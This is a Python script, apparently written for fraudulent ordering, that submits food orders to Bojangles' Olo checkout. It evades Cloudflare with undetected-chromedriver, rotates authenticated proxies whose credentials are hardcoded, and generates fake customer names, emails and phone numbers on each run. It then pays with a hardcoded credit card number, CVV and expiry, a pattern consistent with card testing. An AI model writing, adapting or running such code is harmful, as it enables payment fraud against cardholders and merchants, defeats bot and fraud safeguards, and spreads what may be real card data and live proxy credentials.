#!/usr/bin/env python3
"""
BOJANGLES ORDER AUTOMATION - FINAL WORKING VERSION
Uses Selenium with undetected-chromedriver to bypass Cloudflare
"""

import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import random
import time
import requests

# --- VALIDATED USA PROXIES ONLY (7 Working Proxies) ---
usa_proxy_list = [
    {"host": "142.111.48.253", "port": "7030", "user": "iicwyzxj", "pass": "43fcbrangis0"},
    {"host": "23.95.150.145", "port": "6114", "user": "iicwyzxj", "pass": "43fcbrangis0"},
    {"host": "198.23.239.134", "port": "6540", "user": "iicwyzxj", "pass": "43fcbrangis0"},
    {"host": "107.172.163.27", "port": "6543", "user": "iicwyzxj", "pass": "43fcbrangis0"},
    {"host": "216.10.27.159", "port": "6837", "user": "iicwyzxj", "pass": "43fcbrangis0"},
    {"host": "23.26.71.145", "port": "5628", "user": "iicwyzxj", "pass": "43fcbrangis0"},
    {"host": "23.27.208.120", "port": "5830", "user": "iicwyzxj", "pass": "43fcbrangis0"},
]

# --- User-Agents ---
user_agent_list = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

# --- Pre-defined lists for rotating user data ---
first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
email_domains = ["@gmail.com", "@yahoo.com", "@outlook.com", "@hotmail.com"]

def get_random_phone_number():
    """Generates a random US-formatted phone number."""
    return f"{random.randint(201, 999)}-{random.randint(100, 999)}-{random.randint(1000, 9999)}"

def get_access_token_via_requests(order_id, proxy_dict):
    """Fetch access token using requests library (this part works fine)"""
    try:
        token_url = f'https://www.bojangles.com/api/v1/orders/{order_id}/token'
        proxies = {
            "http": f"http://{proxy_dict['user']}:{proxy_dict['pass']}@{proxy_dict['host']}:{proxy_dict['port']}",
            "https": f"http://{proxy_dict['user']}:{proxy_dict['pass']}@{proxy_dict['host']}:{proxy_dict['port']}"
        }
        
        response = requests.post(token_url, proxies=proxies, timeout=15)
        if response.status_code == 200:
            return response.json().get('accesstoken')
    except Exception as e:
        print(f"[!] Error fetching token: {e}")
    return None

def process_order_with_selenium():
    """
    Complete order automation using Selenium
    """
    driver = None
    
    try:
        # Select random proxy and user data
        proxy_choice = random.choice(usa_proxy_list)
        user_agent = random.choice(user_agent_list)
        
        print("="*70)
        print("BOJANGLES ORDER AUTOMATION - FINAL VERSION")
        print("="*70)
        print(f"[*] Using USA Proxy: {proxy_choice['host']}:{proxy_choice['port']}")
        print(f"[*] Using User-Agent: {user_agent}")
        
        # Generate random user data
        first_name = random.choice(first_names)
        last_name = random.choice(last_names)
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10,99)}{random.choice(email_domains)}"
        phone_number = get_random_phone_number()
        
        print(f"\n[*] Using Rotated User Data:")
        print(f"    - Name: {first_name} {last_name}")
        print(f"    - Email: {email}")
        print(f"    - Phone: {phone_number}")
        
        # Step 1: Get access token (using requests, this works)
        order_id = "def67214-7132-4e25-a8ea-7a18923f734f"
        
        print(f"\n[*] Fetching access token...")
        access_token = get_access_token_via_requests(order_id, proxy_choice)
        
        if not access_token:
            print("[!] Failed to get access token. Trying without proxy...")
            # Try without proxy as fallback
            response = requests.post(f'https://www.bojangles.com/api/v1/orders/{order_id}/token', timeout=15)
            if response.status_code == 200:
                access_token = response.json().get('accesstoken')
        
        if not access_token:
            print("[!] Could not fetch access token. Exiting.")
            return
        
        print(f"[+] Successfully retrieved Access Token: {access_token}")
        
        # Step 2: Setup Selenium browser
        print(f"\n[*] Setting up browser...")
        
        options = uc.ChromeOptions()
        options.add_argument(f'user-agent={user_agent}')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        # Note: Proxy with auth is complex in Selenium, so we'll try without proxy first
        # The browser fingerprint is more important than proxy for Cloudflare
        
        driver = uc.Chrome(options=options, version_main=None)
        driver.set_page_load_timeout(30)
        
        # Step 3: Navigate to checkout page
        checkout_url = f'https://www.olocheckout.com/checkout?brandAccessId=pOsOaQRlbWrRjoMlO82GyeaaXhVRBNwn&BasketGuid={order_id}'
        
        print(f"[*] Navigating to checkout page...")
        driver.get(checkout_url)
        
        # Wait for page to load
        time.sleep(5)
        
        # Check if Cloudflare blocked us
        if "cloudflare" in driver.page_source.lower() and "blocked" in driver.page_source.lower():
            print("\n[-] Cloudflare blocked the browser")
            return
        
        print("[+] Successfully loaded checkout page (no Cloudflare block!)")
        
        # Step 4: Submit order using JavaScript
        print(f"\n[*] Submitting order via JavaScript...")
        
        submit_url = f'https://www.olocheckout.com/api/baskets/{order_id}/submit'
        
        order_data = {
            'brandAccessId': 'pOsOaQRlbWrRjoMlO82GyeaaXhVRBNwn',
            'accessToken': access_token,
            'firstName': first_name,
            'lastName': last_name,
            'emailAddress': email,
            'contactNumber': phone_number,
            'customData': [],
            'billingAccounts': [{
                'billingFields': [],
                'billingMethod': 'creditcard',
                'expiryYear': '2028',
                'expiryMonth': '10',
                'zip': '10080',
                'saveOnFile': False,
                'amount': 11.49,
                'tipPortion': 0,
                'cardNumber': '4677845104934858',
                'cvv': '548',
            }],
            'bookingUserOptIntoSms': False,
            'createOloAccount': False,
        }
        
        # Use JavaScript fetch API to submit order
        import json
        script = f"""
        var callback = arguments[arguments.length - 1];
        
        fetch('{submit_url}', {{
            method: 'POST',
            headers: {{
                'Content-Type': 'application/json',
                'x-olo-domain-origin': 'https://www.bojangles.com',
                'x-olo-request': '1'
            }},
            body: JSON.stringify({json.dumps(order_data)})
        }})
        .then(response => {{
            return response.text().then(text => ({{
                status: response.status,
                statusText: response.statusText,
                body: text
            }}));
        }})
        .then(data => callback(data))
        .catch(error => callback({{error: error.toString()}}));
        """
        
        result = driver.execute_async_script(script)
        
        # Display results
        print("\n" + "="*70)
        print("FINAL RESPONSE")
        print("="*70)
        
        if 'error' in result:
            print(f"[!] JavaScript Error: {result['error']}")
        else:
            status = result.get('status')
            body = result.get('body', '')
            
            print(f"Status Code: {status}")
            print(f"Status Text: {result.get('statusText', '')}")
            print(f"\nResponse Body:")
            print(body)
            
            if status == 200:
                print("\n" + "🎉"*20)
                print("SUCCESS! Order submitted successfully!")
                print("🎉"*20)
            elif status == 403:
                if 'cloudflare' in body.lower():
                    print("\n[-] Blocked by Cloudflare")
                else:
                    print("\n[-] Request forbidden (403)")
            elif status == 400:
                print("\n[!] Bad Request - Check order data or token validity")
            else:
                print(f"\n[!] Unexpected status: {status}")
        
        print("="*70)
        
    except Exception as e:
        print(f"\n[!] An error occurred: {e}")
        import traceback
        traceback.print_exc()
    
    finally:
        if driver:
            print("\n[*] Closing browser...")
            time.sleep(2)
            driver.quit()

if __name__ == "__main__":
    process_order_with_selenium()
